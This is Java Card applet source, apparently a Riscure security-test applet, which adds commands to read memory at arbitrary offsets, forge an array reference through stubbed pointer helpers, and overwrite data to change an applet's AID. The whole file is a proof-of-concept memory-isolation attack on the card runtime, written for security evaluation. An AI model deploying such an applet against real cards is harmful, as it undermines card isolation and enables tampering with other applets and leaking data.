/** Copyright 2016 Riscure */
package aid_modification;

import javacard.framework.*;

/**
 * @aid 0xA0:0x00:0x00:0x00:0xEE:0x01:0x01
 * @version 1.0
 */
public class AIDModification extends Applet {
  protected static final byte CLA_APP = (byte) 0xA0; // CLASS byte for regular APDUs

  protected static final byte INS_READ = (byte) 0xB0; // INS byte to read data from file
  protected static final byte INS_PATCH = (byte) 0xB1; // INS byte to patch file length
  protected static final byte INS_WRITE = (byte) 0xB2; // INS byte to change AID

  byte[] mem = {(byte) 0x7F, (byte) 0xFF, (byte) 0x01, (byte) 0x00};
  byte[] file = mem;

  public static void install(byte[] bArray, short bOffset, byte bLength) {
    new AIDModification(bArray, bOffset, bLength);
  }

  protected AIDModification(byte[] bArray, short bOffset, byte bLength) {
    register();
  }

  public void process(APDU apdu) {
    short offset, length;

    byte[] buffer = apdu.getBuffer();
    if (selectingApplet()) return;
    if (buffer[ISO7816.OFFSET_CLA] != CLA_APP) ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);

    switch (buffer[ISO7816.OFFSET_INS]) {
      case INS_READ: // read from arbitrary memory position
        offset = Util.getShort(buffer, ISO7816.OFFSET_P1);
        length = (short) (buffer[ISO7816.OFFSET_LC] & 0xFF); // Le
        if (length == (short) 0) { // report length of file
          Util.setShort(buffer, (short) 0, (short) file.length);
          apdu.setOutgoingAndSend((short) 0, (short) 2);
        } else {
          if (offset < (short) 0 || offset > (short) file.length) // wrong offset
          ISOException.throwIt(ISO7816.SW_WRONG_P1P2);
          if ((short) (offset + length) > (short) file.length) // wrong length
          ISOException.throwIt(ISO7816.SW_WRONG_LENGTH);
          Util.arrayCopy(file, offset, buffer, (short) 0, length);
          apdu.setOutgoingAndSend((short) 0, length);
        }
        break;

      case INS_WRITE:
        // buffer data content: | offset1 | offset2 | AID len | AID |
        offset = Util.getShort(buffer, ISO7816.OFFSET_CDATA);
        Util.arrayCopy(
            buffer,
            (short) (ISO7816.OFFSET_CDATA + 5),
            file,
            offset,
            (short) (buffer[(short) (ISO7816.OFFSET_CDATA + 4)]));
        offset = Util.getShort(buffer, (short) (ISO7816.OFFSET_CDATA + 2));
        Util.arrayCopy(
            buffer,
            (short) (ISO7816.OFFSET_CDATA + 5),
            file,
            offset,
            (short) (buffer[(short) (ISO7816.OFFSET_CDATA + 4)]));
        break;

      case INS_PATCH: // forge metadata
        file = ptr((short) (addr(mem) + 4));
        Util.setShort(buffer, (short) 0, (short) file.length);
        apdu.setOutgoingAndSend((short) 0, (short) 2);
        break;
      default:
        ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
    }
  }

  public static short addr(byte[] ptr) {
    // return (short)ptr;
    return 0; // dummy statement
  }

  public static byte[] ptr(short addr) {
    return null; // dummy statement
  }
}
